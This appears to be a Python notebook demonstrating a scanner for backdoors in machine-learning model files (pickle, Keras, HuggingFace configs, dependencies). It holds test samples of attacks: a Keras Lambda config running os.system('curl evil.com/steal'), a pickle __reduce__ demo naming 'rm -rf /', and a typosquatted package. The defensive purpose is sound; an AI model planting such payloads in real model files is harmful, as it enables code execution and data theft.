# ---
# jupyter:
#   jupytext:
#     text_representation:
#       extension: .py
#       format_name: percent
#   kernelspec:
#     display_name: Python 3
#     language: python
#     name: python3
# ---

# %% [markdown]
# # 🔬 Eresus Sentinel — Model Backdoor Analysis Lab
#
# Interactive notebook for analyzing model artifacts for embedded backdoors,
# malicious serialization, and supply chain tampering.
#
# **Capabilities:**
# - Pickle opcode disassembly & dangerous global detection
# - Keras Lambda layer inspection
# - ONNX custom operator analysis
# - Archive traversal attack detection
# - HuggingFace config.json audit
# - SHA256 integrity verification
# - Supply chain dependency scanning

# %% [markdown]
# ## Setup

# %%
import sys
import os
import json
import hashlib
from pathlib import Path
from datetime import datetime

# Add project to path
PROJECT_ROOT = Path("..").resolve()
sys.path.insert(0, str(PROJECT_ROOT / "python"))

from sentinel.artifact.pickle_scanner import PickleScanner
from sentinel.artifact.keras_scanner import KerasScanner
from sentinel.artifact.onnx_scanner import ONNXScanner
from sentinel.artifact.archiveslip import ArchiveSlipDetector
from sentinel.artifact.hf_scanner import HuggingFaceScanner
from sentinel.supply_chain.provenance import ProvenanceVerifier
from sentinel.supply_chain.dependency import DependencyAuditor
from sentinel.finding import Finding, Severity

print(f"🛡️  Eresus Sentinel — Model Backdoor Lab")
print(f"📅 Session: {datetime.now().isoformat()}")
print(f"📂 Project: {PROJECT_ROOT}")

# %% [markdown]
# ## 1. Pickle Backdoor Analysis
#
# Pickle files use a stack-based VM with opcodes that can call arbitrary
# Python functions via `__reduce__`. We scan for dangerous globals.

# %%
def analyze_pickle(filepath: str) -> None:
    """Run pickle backdoor analysis on a file."""
    scanner = PickleScanner()
    findings = scanner.scan(filepath)

    if not findings:
        print(f"✅ {filepath}: No dangerous operations found")
        return

    print(f"🚨 {filepath}: {len(findings)} finding(s)")
    for f in findings:
        print(f"  [{f.severity.name}] {f.title}")
        print(f"    → {f.description}")
        if f.evidence:
            print(f"    📋 Evidence: {f.evidence}")
        print()

# Example usage (uncomment with actual file paths):
# analyze_pickle("/path/to/suspicious_model.pkl")

# %% [markdown]
# ### 1.1 Create Test Payload
#
# For research purposes, we can create a benign pickle that demonstrates
# the attack vector (executes `print` instead of malicious code).

# %%
import pickle
import tempfile

class BenignDemo:
    """Demonstrates pickle __reduce__ with harmless payload."""
    def __reduce__(self):
        return (print, ("⚠️  This could have been os.system('rm -rf /') !",))

# Create and scan the demo payload
demo_path = Path(tempfile.mktemp(suffix=".pkl"))
with open(demo_path, "wb") as f:
    pickle.dump(BenignDemo(), f)

print(f"📦 Created demo pickle: {demo_path}")
analyze_pickle(str(demo_path))

# Cleanup
demo_path.unlink()

# %% [markdown]
# ## 2. Keras Lambda Layer Inspection
#
# Keras models with Lambda layers contain embedded Python code that
# executes during model loading — a known attack vector (CVE-2025-1550).

# %%
def analyze_keras_config(config: dict) -> None:
    """Analyze a Keras model config for Lambda layer backdoors."""
    scanner = KerasScanner()
    # Create a minimal temp file with the config
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump({"config": config}, f)
        tmp_path = f.name

    findings = scanner.scan(tmp_path)
    os.unlink(tmp_path)

    if not findings:
        print("✅ No Lambda layer threats detected")
        return

    for f in findings:
        print(f"  [{f.severity.name}] {f.title}: {f.description}")

# Example: Malicious Lambda layer
malicious_config = {
    "class_name": "Sequential",
    "config": {
        "layers": [
            {
                "class_name": "Lambda",
                "config": {
                    "function": "__import__('os').system('curl evil.com/steal')"
                }
            }
        ]
    }
}

print("🔍 Scanning malicious Keras config:")
analyze_keras_config(malicious_config)

# %% [markdown]
# ## 3. Supply Chain Integrity Verification
#
# Verify model file integrity using SHA256 checksums.

# %%
def verify_model_integrity(filepath: str, expected_hash: str) -> None:
    """Verify a model file's SHA256 hash."""
    verifier = ProvenanceVerifier()
    findings = verifier.verify_integrity(filepath, expected_hash)

    if not findings:
        print(f"✅ {filepath}: Integrity verified")
    else:
        for f in findings:
            print(f"🚨 [{f.severity.name}] {f.title}")
            print(f"   {f.description}")

# Example: Create a file and verify it
test_file = Path(tempfile.mktemp(suffix=".safetensors"))
test_content = b"model weight data for testing"
test_file.write_bytes(test_content)
correct_hash = hashlib.sha256(test_content).hexdigest()
wrong_hash = "deadbeef" * 8

print("Test 1 — Correct hash:")
verify_model_integrity(str(test_file), correct_hash)

print("\nTest 2 — Tampered hash:")
verify_model_integrity(str(test_file), wrong_hash)

test_file.unlink()

# %% [markdown]
# ## 4. HuggingFace Repository Audit
#
# Analyze a model directory for security issues: dangerous file types,
# missing safetensors, auto_map exploitation, trust_remote_code.

# %%
def audit_model_directory(dirpath: str) -> None:
    """Full supply chain audit of a model directory."""
    verifier = ProvenanceVerifier()
    findings = verifier.audit_directory(dirpath)

    if not findings:
        print(f"✅ {dirpath}: Clean")
        return

    # Group by severity
    by_severity = {}
    for f in findings:
        sev = f.severity.name
        by_severity.setdefault(sev, []).append(f)

    print(f"📊 Audit Results for: {dirpath}")
    print(f"   Total findings: {len(findings)}")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in by_severity:
            print(f"   {sev}: {len(by_severity[sev])}")

    print("\n📋 Details:")
    for f in findings:
        print(f"  [{f.severity.name}] {f.title}")
        print(f"    → {f.description}\n")

# Example: Create a suspicious model directory
test_dir = Path(tempfile.mkdtemp(prefix="model_audit_"))
(test_dir / "model.pkl").write_bytes(b"pickle data")
(test_dir / "weights.bin").write_bytes(b"binary weights")
(test_dir / "config.json").write_text(json.dumps({
    "model_type": "bert",
    "auto_map": {"AutoModel": "custom--MyBertModel"},
    "trust_remote_code": True,
}))

print("🔍 Auditing suspicious model directory:")
audit_model_directory(str(test_dir))

# Cleanup
import shutil
shutil.rmtree(test_dir)

# %% [markdown]
# ## 5. Dependency Vulnerability Scan

# %%
def scan_dependencies(filepath: str) -> None:
    """Scan a requirements file for known vulnerabilities."""
    auditor = DependencyAuditor()
    findings = auditor.audit_file(filepath)

    if not findings:
        print(f"✅ {filepath}: No issues found")
        return

    print(f"📊 Dependency scan: {len(findings)} finding(s)")
    for f in findings:
        print(f"  [{f.severity.name}] {f.title}")
        print(f"    → {f.description}\n")

# Example
req_file = Path(tempfile.mktemp(suffix="_requirements.txt"))
req_file.write_text("""
transformers==4.30.0
torch>=2.0.0
langchain==0.0.200
numpy
safetensors==0.4.1
transforers==4.35.0
""")

print("🔍 Scanning dependencies:")
scan_dependencies(str(req_file))
req_file.unlink()

# %% [markdown]
# ## 6. Batch Model Audit
#
# Scan an entire directory tree for model artifacts.

# %%
def batch_audit(root_dir: str) -> dict:
    """Audit all model files in a directory tree."""
    root = Path(root_dir)
    results = {
        "total_files": 0,
        "findings": [],
        "scanners_used": set(),
    }

    scanner_map = {
        ".pkl": ("PickleScanner", PickleScanner()),
        ".pickle": ("PickleScanner", PickleScanner()),
    }

    for fpath in root.rglob("*"):
        if fpath.is_dir() or ".git" in fpath.parts:
            continue

        results["total_files"] += 1
        ext = fpath.suffix.lower()

        if ext in scanner_map:
            name, scanner = scanner_map[ext]
            results["scanners_used"].add(name)
            try:
                findings = scanner.scan(str(fpath))
                results["findings"].extend(findings)
            except Exception as e:
                print(f"⚠️  Error scanning {fpath}: {e}")

    # Also run supply chain audit
    verifier = ProvenanceVerifier()
    sc_findings = verifier.audit_directory(root_dir)
    results["findings"].extend(sc_findings)

    return results

# Usage:
# results = batch_audit("/path/to/models/")
# print(f"Scanned {results['total_files']} files, found {len(results['findings'])} issues")

print("✅ Batch audit function ready. Call batch_audit('/path/to/models/')")

# %% [markdown]
# ---
# ## Summary
#
# This notebook demonstrates Eresus Sentinel's model backdoor detection capabilities:
#
# | Scanner | What it detects |
# |---------|----------------|
# | PickleScanner | Dangerous __reduce__, os.system, subprocess, eval |
# | KerasScanner | Lambda layers with embedded code (CVE-2025-1550) |
# | ONNXScanner | Custom operators, external data references |
# | ArchiveSlipDetector | ZipSlip, TarSlip, symlink traversal |
# | HuggingFaceScanner | auto_map, trust_remote_code, dangerous files |
# | ProvenanceVerifier | SHA256 integrity, model card, config flags |
# | DependencyAuditor | Known vulns, typosquatting, pinning hygiene |
